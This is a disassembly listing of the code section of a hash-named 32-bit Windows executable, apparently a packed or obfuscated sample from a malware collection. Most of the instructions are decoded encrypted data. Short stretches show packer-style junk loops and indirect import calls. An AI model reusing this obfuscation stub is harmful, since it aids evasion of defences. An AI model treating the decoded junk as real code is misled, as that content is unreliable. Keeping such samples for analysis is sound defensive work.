
412e58f22f2999b728bb513c45c118215244e1dc8e09a82ca81fb117c5a2ace1.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc98
  40100b:	jmp    0x4011ce
  401010:	inc    DWORD PTR ss:[esi]
  401013:	shl    BYTE PTR [edi-0x1ca60faf],1
  401019:	fs cmp eax,0xad87de8c
  40101f:	nop
  401020:	jle    0x4010a0
  401022:	jle    0x4010a2
  401024:	cwde   
  401025:	jg     0x4010a5
  401027:	jle    0x400ff7
  401029:	xlat   BYTE PTR ds:[ebx]
  40102a:	cmp    eax,0xcfd339d5
  40102f:	rol    eax,1
  401031:	pop    es
  401032:	add    al,0x3
  401034:	push   cs
  401035:	js     0x401037
  401037:	rdpmc  
  401039:	xadd   BYTE PTR [eax],bl
  40103c:	(bad)  
  40103d:	adc    BYTE PTR [edi],bl
  40103f:	mov    ecx,0xddb70058
  401044:	push   cs
  401045:	out    dx,eax
  401046:	mov    ebp,0x8e03d6db
  40104b:	es mov esi,0x1541a2f4
  401051:	lods   eax,DWORD PTR ds:[esi]
  401052:	fiadd  WORD PTR [esi+0x1f]
  401055:	data16 in al,dx
  401057:	outs   dx,DWORD PTR ds:[esi]
  401058:	or     edx,DWORD PTR [ecx]
  40105a:	pushf  
  40105b:	js     0x401033
  40105d:	inc    eax
  40105e:	stos   BYTE PTR es:[edi],al
  40105f:	push   ebx
  401060:	sub    eax,0xad3cc4d1
  401065:	mov    bh,BYTE PTR [ebx-0x3b]
  401068:	stos   DWORD PTR es:[edi],eax
  401069:	push   es
  40106a:	(bad)  
  40106b:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  401071:	jmp    0x4010a3
  401073:	mov    ebp,ecx
  401075:	dec    edi
  401076:	out    0xa6,al
  401078:	inc    ecx
  401079:	call   DWORD PTR [edi-0x2556f868]
  40107f:	mov    ebp,0x5536ed4d
  401084:	and    esi,DWORD PTR [edx-0x43619116]
  40108a:	jnp    0x40109d
  40108c:	ret    
  40108d:	xchg   edx,eax
  40108e:	and    esp,edx
  401090:	jmp    0x4010f0
  401092:	ret    0xb8e4
  401095:	lock jmp 0xd765:0x74cf3192
  40109d:	and    ch,cl
  40109f:	add    bl,cl
  4010a1:	adc    DWORD PTR [ecx-0x5a],edx
  4010a4:	xor    eax,0x78616f03
  4010a9:	or     BYTE PTR [ecx],dh
  4010ab:	fisttp QWORD PTR [esi+0x7f752854]
  4010b1:	(bad)
  4010b6:	or     ebx,DWORD PTR [ebx+0x55]
  4010b9:	fst    st(6)
  4010bb:	or     ebx,edx
  4010bd:	pop    esp
  4010be:	fstp   DWORD PTR [ecx]
  4010c0:	jno    0x401060
  4010c2:	inc    esi
  4010c3:	dec    ebx
  4010c4:	aaa    
  4010c5:	adc    eax,0x1a29772b
  4010ca:	sar    DWORD PTR [esi],cl
  4010cc:	dec    edi
  4010cd:	call   0x41b3b59e
  4010d2:	xor    edx,DWORD PTR [edx]
  4010d4:	dec    ebp
  4010d5:	push   ebx
  4010d6:	jo     0x401121
  4010d8:	sbb    bl,BYTE PTR [esi+ebx*8-0x5cc95db]
  4010df:	rcr    DWORD PTR [eax-0x68821b40],0x95
  4010e6:	addr16 fdivrp st(0),st
  4010e9:	fs sti 
  4010eb:	pop    ss
  4010ec:	pop    ss
  4010ed:	aas    
  4010ee:	(bad)  
  4010ef:	out    dx,eax
  4010f0:	pusha  
  4010f1:	(bad)  
  4010f2:	pop    ecx
  4010f3:	jp     0x4010e0
  4010f5:	xchg   edx,eax
  4010f6:	add    BYTE PTR [ebp+edi*4-0x412311d1],0xb3
  4010fe:	(bad)  
  4010ff:	clc    
  401100:	and    edx,DWORD PTR [esi]
  401102:	mov    esi,0xf7ee107d
  401107:	push   edi
  401108:	pop    ebp
  401109:	ins    DWORD PTR es:[edi],dx
  40110a:	and    ch,ah
  40110c:	pop    es
  40110d:	xchg   DWORD PTR [edx+0x51429f45],ebp
  401113:	std    
  401114:	mov    dl,0x66
  401116:	rcr    BYTE PTR [edi+0x4754591a],1
  40111c:	loope  0x40111f
  40111e:	loope  0x401112
  401120:	(bad)  [edx+0x1d]
  401123:	and    eax,0xd4574582
  401128:	push   eax
  401129:	inc    ebp
  40112a:	fcom   QWORD PTR ds:0x51c7ee8d
  401130:	lahf   
  401131:	hlt    
  401132:	int    0xe4
  401134:	cdq    
  401135:	push   ebx
  401136:	push   ecx
  401137:	adc    eax,0x74677510
  40113c:	cwde   
  40113d:	lods   al,BYTE PTR ds:[esi]
  40113e:	jmp    0x412093c0
  401143:	cld    
  401144:	jmp    0x401109
  401146:	push   ss
  401147:	mov    ah,0x54
  401149:	inc    edx
  40114a:	sub    ebp,DWORD PTR [ebx+ebp*2]
  40114d:	dec    edx
  40114e:	test   esi,esi
  401150:	iret   
  401151:	mov    cl,0xd8
  401153:	jne    0x40110e
  401155:	(bad)  
  401156:	xchg   edi,eax
  401157:	sub    esi,esp
  401159:	sub    esp,DWORD PTR [esi-0x2]
  40115c:	cmp    al,0x1a
  40115e:	sub    DWORD PTR [ecx-0x1a0c7d85],ebp
  401164:	lahf   
  401165:	pop    ebx
  401166:	int3   
  401167:	adc    cl,al
  401169:	fstp   TBYTE PTR [ecx]
  40116b:	pop    edi
  40116c:	jp     0x40114e
  40116e:	in     al,dx
  40116f:	jmpw   0xb038
  401173:	test   eax,0xdcf65412
  401178:	dec    ebp
  401179:	push   cs
  40117a:	cmp    BYTE PTR cs:[esp+esi*4-0x36],dl
  40117f:	push   ebx
  401180:	in     al,0x5c
  401182:	fisttp DWORD PTR [edx]
  401184:	and    cl,cl
  401186:	mov    ch,0x78
  401188:	call   0x9de8:0x50b3c91b
  40118f:	nop
  401190:	fbstp  TBYTE PTR [ecx-0x7acf6a64]
  401196:	fidiv  WORD PTR [ebp-0x15b2d96e]
  40119c:	sub    DWORD PTR [edi-0x5],edi
  40119f:	lods   eax,DWORD PTR ds:[esi]
  4011a0:	imul   ebx,edi,0xe320f52e
  4011a6:	pop    eax
  4011a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4011a8:	push   ecx
  4011a9:	cmp    eax,0xfea649a3
  4011ae:	sub    ah,BYTE PTR ds:0x74257bae
  4011b4:	and    eax,0xae854dc6
  4011b9:	add    al,0xd9
  4011bb:	cwde   
  4011bc:	repz gs push 0xffffffd2
  4011c0:	inc    ebx
  4011c1:	fdiv   DWORD PTR [edi+eiz*1]
  4011c4:	xor    eax,0x660bd541
  4011c9:	imul   esp,DWORD PTR [eax-0x76341edf],0x3ab9e045
  4011d3:	pop    ebp
  4011d4:	add    BYTE PTR [eax],al
  4011d6:	mov    ecx,DWORD PTR [ebp-0x20]
  4011d9:	mov    DWORD PTR [ebp-0x24],0x4ec1
  4011e0:	cmp    ecx,eax
  4011e2:	jne    0x4020c2
  4011e8:	sbb    ecx,0xfa8
  4011ee:	mov    ax,WORD PTR [ebp-0x24]
  4011f2:	and    DWORD PTR ds:0x4302d5,0x0
  4011fc:	mov    ecx,DWORD PTR ds:0x4302d5
  401202:	inc    ecx
  401203:	mov    DWORD PTR ds:0x4302d5,ecx
  401209:	cmp    DWORD PTR ds:0x4302d5,0xb
  401210:	jne    0x401248
  401216:	push   0x25a9
  40121b:	push   0x3372
  401220:	push   0x5bb7
  401225:	push   DWORD PTR [ebp-0x1c]
  401228:	push   0x6ec1
  40122d:	push   DWORD PTR [ebp-0x28]
  401230:	push   0x3d62
  401235:	push   0x5689
  40123a:	push   DWORD PTR [ebp-0x28]
  40123d:	push   0x7975
  401242:	call   DWORD PTR ds:0x42ea8b
  401248:	cmp    DWORD PTR ds:0x4302d5,0xa
  40124f:	jne    0x401262
  401255:	mov    ecx,DWORD PTR ds:0x4302d5
  40125b:	inc    ecx
  40125c:	mov    DWORD PTR ds:0x4302d5,ecx
  401262:	cmp    DWORD PTR ds:0x4302d5,0x12
  401269:	jb     0x4011fc
  40126f:	mov    DWORD PTR ds:0x4302cd,0x1e
  401279:	cmp    DWORD PTR ds:0x4302cd,0x0
  401280:	je     0x401471
  401286:	cmp    DWORD PTR ds:0x4302cd,0x2d
  40128d:	jne    0x40129c
  401293:	push   DWORD PTR [ebp-0x20]
  401296:	call   DWORD PTR ds:0x42e827
  40129c:	mov    ecx,DWORD PTR ds:0x4302cd
  4012a2:	dec    ecx
  4012a3:	mov    DWORD PTR ds:0x4302cd,ecx
  4012a9:	jmp    0x401279
  4012ae:	jmp    0x401471
  4012b3:	out    0xe8,al
  4012b5:	sub    al,BYTE PTR [ebx]
  4012b7:	xor    cl,al
  4012b9:	imul   ecx
  4012bb:	and    BYTE PTR [ecx],bh
  4012bd:	adc    esi,DWORD PTR [ebx+0x447696e2]
  4012c3:	cwde   
  4012c4:	jg     0x401344
  4012c6:	jle    0x401260
  4012c8:	jg     0x401348
  4012ca:	jle    0x40128f
  4012cc:	inc    ebx
  4012cd:	and    dl,al
  4012cf:	cmc    
  4012d0:	mov    edi,0x9e8b0b64
  4012d5:	mov    dl,0x16
  4012d7:	sub    al,BYTE PTR [edx+0x73486323]
  4012dd:	jmp    0x40127c
  4012df:	gs adc ebp,edi
  4012e2:	dec    eax
  4012e3:	dec    eax
  4012e4:	rcr    BYTE PTR [esi+0x5b],cl
  4012e7:	mov    al,0x39
  4012e9:	aaa    
  4012ea:	mov    ah,0x5d
  4012ec:	aam    0xcf
  4012ee:	pop    edx
  4012ef:	pusha  
  4012f0:	pop    ebp
  4012f1:	mov    ds:0x1cc719cc,al
  4012f6:	cld    
  4012f7:	bound  edx,QWORD PTR [esi-0x299502f8]
  4012fd:	add    BYTE PTR [edx],0xf6
  401300:	aam    0x21
  401302:	mov    al,0xe7
  401304:	(bad)  
  401305:	fidivr WORD PTR [ecx+0x2c]
  401308:	call   0x97bf:0xf87d34a6
  40130f:	adc    BYTE PTR [eax+0x64],cl
  401312:	out    dx,eax
  401313:	push   ecx
  401314:	fidivr WORD PTR [edi]
  401316:	std    
  401317:	push   edx
  401318:	and    eax,eax
  40131a:	or     cl,BYTE PTR [ebx+0x4bf62f17]
  401320:	pop    ss
  401321:	cld    
  401322:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401323:	mov    esi,0x415aaa32
  401328:	les    eax,FWORD PTR [esp+esi*2]
  40132b:	inc    ecx
  40132c:	jo     0x401383
  40132e:	cmovge edx,ecx
  401331:	push   ds
  401332:	xchg   DWORD PTR [bp+di-0x75],ebx
  401336:	or     edx,edx
  401338:	xor    BYTE PTR [ecx],bl
  40133a:	xchg   edx,eax
  40133b:	pop    ss
  40133c:	push   es
  40133d:	dec    esi
  40133e:	push   esi
  40133f:	jp     0x401328
  401341:	inc    ecx
  401342:	add    eax,0x30191dde
  401347:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401348:	addr16 std 
  40134a:	psubusb mm0,mm7
  40134d:	push   ecx
  40134e:	sub    eax,0x3c76493e
  401353:	cmp    DWORD PTR [edx],eax
  401355:	dec    ebp
  401356:	inc    edx
  401357:	fld    TBYTE PTR [esi+0x46403425]
  40135d:	aad    0xb4
  40135f:	ins    BYTE PTR es:[edi],dx
  401360:	pop    es
  401361:	imul   ebp,DWORD PTR [eax+0x2c],0x1a15abe4
  401368:	shl    BYTE PTR [edx+0x2a],0x91
  40136c:	fistp  DWORD PTR [ebx+0x58102129]
  401372:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401373:	mov    al,0x50
  401375:	(bad)  
  401377:	loop   0x40130d
  401379:	xor    eax,0x46b9b02b
  40137e:	adc    ebp,DWORD PTR [edx+ebp*1]
  401381:	inc    eax
  401382:	les    esi,FWORD PTR [ecx-0x25ea517]
  401388:	int    0x6b
  40138a:	arpl   WORD PTR [eax+0x45],sp
  40138d:	push   ebx
  40138e:	add    esi,DWORD PTR [edx+0x65]
  401391:	pop    ebx
  401392:	aam    0xc5
  401394:	jnp    0x40134e
  401396:	es push es
  401398:	sub    edx,DWORD PTR [ebx-0x70]
  40139b:	inc    edi
  40139c:	inc    ecx
  40139d:	(bad)  
  40139e:	push   edi
  40139f:	rcr    BYTE PTR [esp+edi*8],1
  4013a2:	outs   dx,DWORD PTR ds:[esi]
  4013a3:	rol    DWORD PTR [edi-0x15f18e90],cl
  4013a9:	xor    edi,DWORD PTR [edi]
  4013ab:	(bad)  
  4013ac:	sbb    ah,BYTE PTR ds:0xb3deca80
  4013b2:	in     al,0x76
  4013b4:	adc    al,0x8f
  4013b6:	jae    0x4013d8
  4013b8:	into   
  4013b9:	dec    ecx
  4013ba:	stc    
  4013bb:	ss in  eax,0x3a
  4013be:	mov    eax,ds:0x7f78b85e
  4013c3:	mov    dh,0x43
  4013c5:	bound  ecx,QWORD PTR [ebp-0x6ec5c28b]
  4013cb:	cmp    DWORD PTR [bx+di+0x7a53],esi
  4013d0:	imul   ebp,DWORD PTR [edi],0x38
  4013d3:	lock mov ebp,0x591249bf
  4013d9:	std    
  4013da:	das    
  4013db:	jle    0x401369
  4013dd:	xlat   BYTE PTR ds:[ebx]
  4013de:	and    ah,BYTE PTR [eax-0x2364540e]
  4013e4:	xchg   dl,ch
  4013e6:	adc    edi,ebx
  4013e8:	push   cs
  4013e9:	in     eax,0x18
  4013eb:	jae    0x401421
  4013ed:	adc    al,BYTE PTR [edx-0xd]
  4013f0:	adc    ebp,ebx
  4013f2:	lds    edx,FWORD PTR [edi+0x38ca7b03]
  4013f8:	cmp    ebp,DWORD PTR [esi]
  4013fa:	lds    eax,FWORD PTR [ebx-0x1e]
  4013fd:	ficomp WORD PTR [ebp-0x1e286340]
  401403:	int3   
  401404:	inc    ebp
  401405:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401406:	dec    eax
  401407:	ins    BYTE PTR es:[edi],dx
  401408:	scas   eax,DWORD PTR es:[edi]
  401409:	and    al,0xee
  40140b:	jo     0x40140a
  40140d:	test   BYTE PTR [edx],cl
  40140f:	push   cs
  401410:	pushf  
  401411:	adc    eax,0x7afab503
  401416:	ins    BYTE PTR es:[edi],dx
  401417:	or     bl,bh
  401419:	mov    dh,0x45
  40141b:	(bad)  
  40141c:	in     al,dx
  40141d:	aaa    
  40141e:	jl     0x4013c5
  401420:	ror    cl,1
  401422:	pop    esi
  401423:	aas    
  401424:	pop    es
  401425:	xor    BYTE PTR [edx+0x34],al
  401428:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401429:	ja     0x401410
  40142b:	test   al,0xa9
  40142d:	xchg   ebp,eax
  40142e:	mov    ds:0x701298bd,al
  401433:	cli    
  401434:	mov    esp,0xa8ff6680
  401439:	dec    edx
  40143a:	ss push cs
  40143c:	dec    edx
  40143d:	pushf  
  40143e:	xchg   ebx,eax
  40143f:	xchg   DWORD PTR [ebx+esi*1+0x74],eax
  401443:	ins    DWORD PTR es:[edi],dx
  401444:	enter  0xb850,0xf7
  401448:	aad    0xa6
  40144a:	cvtpi2ps xmm7,QWORD PTR [edi]
  40144d:	gs nop
  40144f:	or     eax,0xcad97357
  401454:	xlat   BYTE PTR ds:[ebx]
  401455:	data16 mov dl,0x81
  401458:	cmp    eax,0xc0ea1a07
  40145d:	or     BYTE PTR [ecx+0x17],cl
  401460:	mov    esi,0xbf85a8fd
  401465:	test   BYTE PTR [eax],cl
  401467:	cmc    
  401468:	aam    0xe1
  40146a:	lahf   
  40146b:	fild   WORD PTR [ebx+0x10]
  40146e:	adc    edx,DWORD PTR ds:0x3cb95662
  401474:	mov    al,BYTE PTR [eax]
  401476:	add    BYTE PTR [ecx+0x42ec5b15],al
  40147c:	add    BYTE PTR ds:0x6600002f,bh
  401482:	xor    eax,ecx
  401484:	movzx  esi,WORD PTR ds:0x4302b9
  40148b:	or     DWORD PTR ds:0x43036b,esi
  401491:	mov    ecx,DWORD PTR [ebp+0x8]
  401494:	jmp    0x401657
  401499:	adc    eax,0x716ff192
  40149e:	ins    DWORD PTR es:[edi],dx
  40149f:	xchg   ecx,eax
  4014a0:	jo     0x40144d
  4014a2:	or     eax,0x813d0fff
  4014a7:	rcr    DWORD PTR [edx+eax*8+0x7d],0x7e
  4014ac:	jle    0x401446
  4014ae:	jg     0x40152e
  4014b0:	jle    0x40151d
  4014b2:	out    dx,eax
  4014b3:	out    dx,al
  4014b4:	clc    
  4014b5:	mov    bh,0xa
  4014b7:	stc    
  4014b8:	fld    TBYTE PTR [ebx+0x58]
  4014bb:	push   ebp
  4014bc:	sbb    ecx,ecx
  4014be:	dec    ebx
  4014bf:	push   ebp
  4014c0:	adc    eax,0x68e3d801
  4014c5:	stos   DWORD PTR es:[edi],eax
  4014c6:	dec    esi
  4014c7:	xor    al,0xf8
  4014c9:	(bad)  
  4014ca:	mov    al,0xde
  4014cc:	adc    al,0xf7
  4014ce:	pop    ss
  4014cf:	fs cwde 
  4014d1:	cs mov edx,0xcc81377f
  4014d7:	jnp    0x4014c3
  4014d9:	in     al,dx
  4014da:	pop    ds
  4014db:	jg     0x401470
  4014dd:	xor    eax,0xb719318a
  4014e2:	jo     0x401473
  4014e4:	loope  0x401497
  4014e6:	retf   
  4014e7:	add    ecx,ebp
  4014e9:	sub    DWORD PTR [ebx+0x35f9d28a],0xffffffe2
  4014f0:	mov    ds:0x434d9997,al
  4014f5:	inc    ebx
  4014f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4014f7:	jmp    FWORD PTR [ebx]
  4014f9:	ficomp DWORD PTR [edi-0xf]
  4014fc:	std    
  4014fd:	int    0xc2
  4014ff:	sahf   
  401500:	xchg   ebx,eax
  401501:	pop    esi
  401502:	repnz mov dh,ch
  401505:	push   ecx
  401506:	dec    eax
  401507:	mov    ds:0x42e578ad,al
  40150c:	cmp    eax,0xa83ca65d
  401511:	test   edx,ebp
  401513:	cmp    al,0x84
  401515:	xchg   BYTE PTR [ebx+0x28],cl
  401518:	inc    edi
  401519:	shl    BYTE PTR [ecx+0x5d],0x54
  40151d:	mov    dh,0x9e
  40151f:	push   ebx
  401520:	in     al,dx
  401521:	cs in  eax,0x47
  401524:	jecxz  0x4014e8
  401526:	xchg   edx,eax
  401527:	les    edx,FWORD PTR [edx]
  401529:	push   ds
  40152a:	stc    
  40152b:	(bad)  
  40152c:	iret   
  40152d:	fmul   st,st(6)
  40152f:	push   ss
  401530:	test   ebp,ebx
  401532:	stc    
  401533:	mov    WORD PTR [esi-0x8d1e506],ds
  401539:	cdq    
  40153a:	(bad)  
  40153b:	in     al,dx
  40153c:	hlt    
  40153d:	xchg   BYTE PTR [edi-0x27962aab],ah
  401543:	mov    ebx,0xe49ab0db
  401548:	outs   dx,DWORD PTR ds:[esi]
  401549:	cmp    DWORD PTR ds:0x66a0c4d1,esp
  40154f:	push   edi
  401550:	adc    eax,0xaaccbd73
  401555:	repz dec ecx
  401557:	scas   eax,DWORD PTR es:[edi]
  401558:	mov    ebx,0x356b4ff
  40155d:	shl    BYTE PTR [esi],1
  40155f:	push   cs
  401560:	jl     0x40150a
  401562:	nop
  401563:	mov    edi,0x669511e4
  401568:	sbb    al,0x8b
  40156a:	add    BYTE PTR [ebx],cl
  40156c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40156d:	pusha  
  40156e:	cmp    al,0x7f
  401570:	mov    ebp,0xe3e762c3
  401575:	cdq    
  401576:	xlat   BYTE PTR ds:[ebx]
  401577:	mov    ds,WORD PTR [edx]
  401579:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40157a:	dec    esp
  40157b:	mov    ch,0x5c
  40157d:	loope  0x401513
  40157f:	adc    ebx,esp
  401581:	mov    WORD PTR [ecx-0x6d],ds
  401584:	sbb    eax,0xc85b2f9
  401589:	mov    edi,0xf8f04c2d
  40158e:	cmp    eax,0x503bf1bc
  401593:	adc    DWORD PTR [edx-0x210bf6d0],edx
  401599:	frstor gs:[edi-0x69978b50]
  4015a0:	shr    BYTE PTR [edx-0x49],1
  4015a3:	sub    DWORD PTR [edx-0x68],edx
  4015a6:	lods   eax,DWORD PTR ds:[esi]
  4015a7:	mov    bh,0xab
  4015a9:	dec    ebp
  4015aa:	jge    0x40158f
  4015ac:	push   0xba9f2815
  4015b1:	pop    esp
  4015b2:	jg     0x401541
  4015b4:	pop    ebp
  4015b5:	jle    0x401539
  4015b7:	fcmovnb st,st(4)
  4015b9:	inc    esp
  4015ba:	loop   0x401580
  4015bc:	cmc    
  4015bd:	jns    0x4015e0
  4015bf:	mov    ah,0x61
  4015c1:	and    esi,eax
  4015c3:	cs jne 0x401564
  4015c6:	dec    ebx
  4015c7:	loop   0x4015d2
  4015c9:	call   0xbad3:0x4cd2e822
  4015d0:	int    0xd8
  4015d2:	clc    
  4015d3:	mov    esi,0xae719e52
  4015d8:	push   0x528d5f6
  4015dd:	stos   DWORD PTR es:[edi],eax
  4015de:	lods   eax,DWORD PTR ds:[esi]
  4015df:	jmp    0x401589
  4015e1:	add    ebx,DWORD PTR [esi]
  4015e3:	push   cs
  4015e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015e5:	and    edx,eax
  4015e7:	and    al,0x66
  4015e9:	push   DWORD PTR [edx-0x76]
  4015ec:	ret    0x1363
  4015ef:	lods   al,BYTE PTR ds:[esi]
  4015f0:	mov    ch,0xd2
  4015f2:	inc    ecx
  4015f3:	xchg   edi,eax
  4015f4:	fsubr  st,st(4)
  4015f6:	sbb    al,0x91
  4015f8:	lahf   
  4015f9:	xor    esp,DWORD PTR [ebx-0x456df9d3]
  4015ff:	or     al,BYTE PTR [ebp-0x33]
  401602:	xor    ax,0x6a8f
  401606:	dec    esp
  401607:	(bad)  
  401608:	push   ebp
  401609:	shl    ecx,0x31
  40160c:	dec    esi
  40160d:	push   0xf
  40160f:	mov    cl,BYTE PTR [edi]
  401611:	push   es
  401612:	cs repz es test eax,0xc2bba06a
  40161a:	scas   al,BYTE PTR es:[edi]
  40161b:	je     0x401624
  40161d:	dec    edi
  40161e:	cwde   
  40161f:	mov    al,ds:0xca12bb37
  401624:	xchg   BYTE PTR [ebx],ch
  401626:	(bad)  [ebx]
  401628:	sub    dl,BYTE PTR [edi+0x19]
  40162b:	push   edx
  40162c:	data16 loope 0x4015fa
  40162f:	hlt    
  401630:	lock aad 0x69
  401633:	pop    esi
  401634:	xor    al,0x14
  401636:	pop    esp
  401637:	push   ecx
  401638:	scas   eax,DWORD PTR es:[edi]
  401639:	cmp    dl,BYTE PTR [eax-0x4753ee41]
  40163f:	push   es
  401640:	push   cs
  401641:	loopne 0x401601
  401643:	xchg   ecx,eax
  401644:	lods   al,BYTE PTR ds:[esi]
  401645:	pop    edx
  401646:	hlt    
  401647:	cmp    BYTE PTR [ebx],bh
  401649:	fbstp  TBYTE PTR ds:[eax]
  40164c:	out    0xbc,eax
  40164e:	inc    esi
  40164f:	and    eax,0x620510ff
  401654:	sti    
  401655:	fimul  DWORD PTR [edi]
  401657:	push   edi
  401658:	and    esi,edi
  40165a:	jmp    0x40181d
  40165f:	push   cs
  401660:	and    BYTE PTR [edi],dh
  401662:	pop    ebp
  401663:	xor    DWORD PTR [ecx+0x54],ebp
  401666:	jno    0x4016b3
  401668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401669:	cmp    BYTE PTR [edi],bl
  40166b:	popf   
  40166c:	jo     0x40166d
  40166e:	shr    BYTE PTR [edx+edi*2+0x7e],0x7e
  401673:	cwde   
  401674:	jg     0x4016f4
  401676:	jle    0x401696
  401678:	into   
  401679:	add    DWORD PTR [esi-0x19],0xffffffc5
  40167d:	fidivr DWORD PTR [ebp-0x5b]
  401680:	andps  xmm3,XMMWORD PTR [eax+0x366a1ce5]
  401687:	pop    esi
  401688:	lock gs jecxz 0x401680
  40168c:	push   edi
  40168d:	mov    cl,0xfb
  40168f:	dec    eax
  401690:	nop
  401691:	jmp    0xbbddfd3e
  401696:	xchg   edx,eax
  401697:	sti    
  401698:	pop    edi
  401699:	loop   0x4016d3
  40169b:	call   0xb61d:0x3dde19c7
  4016a2:	mov    ebx,0x26287068
  4016a7:	lock xor al,0xc6
  4016aa:	and    ch,BYTE PTR [ebp-0x4223a4d0]
  4016b0:	mov    eax,0xb920c2b4
  4016b5:	xchg   ebp,eax
  4016b6:	inc    esp
  4016b7:	int    0x2c
  4016b9:	retf   0x4833
  4016bc:	sub    BYTE PTR [ecx],0x9c
  4016bf:	int    0xf8
  4016c1:	das    
  4016c2:	cmc    
  4016c3:	push   esp
  4016c4:	daa    
  4016c5:	mov    ds:0x4fd5774,eax
  4016ca:	addr16 mov di,es
  4016ce:	fcomp  QWORD PTR [esi+0x21]
  4016d1:	jecxz  0x4016cf
  4016d3:	mov    bh,0x9a
  4016d5:	(bad)  
  4016d6:	jmp    0x4016fe
  4016d8:	inc    ebx
  4016d9:	mov    WORD PTR [esi-0x71e2000b],fs
  4016df:	ret    0x2d55
  4016e2:	vpunpcklbw xmm7,xmm7,xmm7
  4016e6:	es inc eax
  4016e8:	ins    BYTE PTR es:[edi],dx
  4016e9:	mov    edi,0x53b525fd
  4016ee:	mov    BYTE PTR [ecx],0x8
  4016f1:	call   0x87a4:0x3256679d
  4016f8:	into   
  4016f9:	pop    ss
  4016fa:	or     al,0x7e
  4016fc:	push   0xf06b1e7b
  401701:	shl    BYTE PTR [esi+esi*2-0x32],0xd2
  401706:	adc    BYTE PTR [ebx],dl
  401708:	(bad)  
  401709:	jmp    0x2934d69e
  40170e:	in     al,dx
  40170f:	pop    eax
  401710:	out    dx,eax
  401711:	jns    0x4016f2
  401713:	outs   dx,DWORD PTR ds:[esi]
  401714:	push   ecx
  401715:	js     0x401767
  401717:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401718:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401719:	fcom   st(1)
  40171b:	add    al,bl
  40171d:	inc    esi
  40171e:	sbb    al,0xf6
  401720:	mov    ebp,0xdc86de20
  401725:	pop    ecx
  401726:	add    DWORD PTR [eax],esi
  401728:	mov    ah,0x9d
  40172a:	pop    esp
  40172b:	ss loopne 0x40178f
  40172e:	sar    BYTE PTR [ebp+0x7],cl
  401731:	dec    ebp
  401732:	mov    edi,edi
  401734:	fld    QWORD PTR [esi]
  401736:	and    BYTE PTR ds:0x75f47ed4,bl
  40173c:	or     DWORD PTR [eax+0x27],edx
  40173f:	mov    dh,0x32
  401741:	stos   DWORD PTR es:[edi],eax
  401742:	js     0x4016db
  401744:	ret    0xa3e1
  401747:	clc    
  401748:	je     0x4017be
  40174a:	ror    eax,0x3e
  40174d:	mov    ch,bh
  40174f:	push   0x65ef3219
  401754:	and    eax,0xa29290e6
  401759:	xor    DWORD PTR [ecx-0x15],ebx
  40175c:	dec    esi
  40175d:	outs   dx,DWORD PTR ds:[esi]
  40175e:	jg     0x40171e
  401760:	inc    esp
  401761:	(bad)  
  401762:	push   ebx
  401763:	(bad)  
  401764:	sub    eax,ebx
  401766:	sar    BYTE PTR [edi-0x78597371],cl
  40176c:	mov    DWORD PTR [esi+0x7e],0xd5ddcda2
  401773:	out    0xf5,eax
  401775:	ins    DWORD PTR es:[edi],dx
  401776:	cs es dec esi
  401779:	gs cs push 0x83b96699
  401780:	aad    0x79
  401782:	cmp    DWORD PTR [ebp+0x6b],eax
  401785:	jecxz  0x4017ef
  401787:	jmp    0xd62d:0xf4bc7dba
  40178e:	mov    ecx,0x2ea3e427
  401793:	std    
  401794:	icebp  
  401795:	lock pop esp
  401797:	ja     0x401785
  401799:	cmp    bl,cl
  40179b:	inc    esi
  40179c:	mov    cl,BYTE PTR [ebp-0x5b]
  40179f:	sub    DWORD PTR [edx],ebx
  4017a1:	cld    
  4017a2:	clc    
  4017a3:	adc    DWORD PTR [ecx],edx
  4017a5:	xchg   ebx,eax
  4017a6:	ret    0x66d7
  4017a9:	push   ebx
  4017aa:	cld    
  4017ab:	stc    
  4017ac:	mov    ebx,0x53022eef
  4017b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017b2:	psadbw mm1,QWORD PTR [ebx-0x56]
  4017b6:	fld    TBYTE PTR [ebx-0x30]
  4017b9:	pusha  
  4017ba:	adc    BYTE PTR [ebx+eax*2],al
  4017bd:	nop
  4017be:	test   DWORD PTR [ebp+0x177afd53],esp
  4017c4:	and    eax,0xb2dadcc1
  4017c9:	pushf  
  4017ca:	aaa    
  4017cb:	imul   eax,esi,0x69eff381
  4017d1:	and    al,0xbd
  4017d3:	popf   
  4017d4:	xor    edi,esp
  4017d6:	ss mov ecx,0xce18ce14
  4017dc:	push   edi
  4017dd:	pop    esi
  4017de:	inc    edi
  4017df:	push   ebx
  4017e0:	xrelease mov DWORD PTR [edi-0x3f],ebx
  4017e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017e5:	adc    al,0xa7
  4017e7:	mov    ?,esi
  4017e9:	adc    DWORD PTR [ebx-0x25],ebx
  4017ec:	pop    ebx
  4017ed:	ret    
  4017ee:	jne    0x4017c9
  4017f0:	mov    dl,0x3b
  4017f2:	jnp    0x40183b
  4017f4:	push   ebx
  4017f5:	or     DWORD PTR [esi-0x7d],ebx
  4017f8:	clc    
  4017f9:	xchg   edi,eax
  4017fa:	call   0x87b0:0x4ca8092e
  401801:	push   cs
  401802:	fistp  DWORD PTR [esp+edi*8]
  401805:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401806:	fcom   QWORD PTR ds:0x6d005812
  40180c:	push   cs
  40180d:	pop    edx
  40180e:	retf   
  40180f:	add    BYTE PTR [esi+0x41aaa6a3],bh
  401815:	add    DWORD PTR [edi],0xffffffe0
  401818:	(bad)  
  401819:	std    
